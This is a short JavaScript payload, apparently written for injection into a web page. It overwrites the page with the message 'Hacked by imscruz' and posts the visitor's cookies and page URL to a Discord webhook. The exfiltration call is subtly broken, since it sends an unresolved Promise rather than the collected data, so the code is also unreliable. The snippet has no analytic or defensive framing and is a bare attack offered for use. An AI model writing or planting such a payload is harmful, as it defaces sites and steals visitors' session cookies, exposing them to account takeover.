document.body.innerHTML='Hacked by imscruz';
fetch('https://discord.com/api/webhooks/1117039673462771804/qgw3Scd_LE5bFNBVZc-XKpgD2VFkwAsBBDmzq7JXbk6fK82Bvfyaf-Z6ifqeNtnD8894',{
method:'POST',
headers:{'Content-Type':'application/json'},
body:JSON.stringify({content:'IP: '+fetch('https://api.ipify.org').then(r=>r.text()).then(ip=>'Cookie: '+document.cookie+'\nURL: '+location.href)})
})
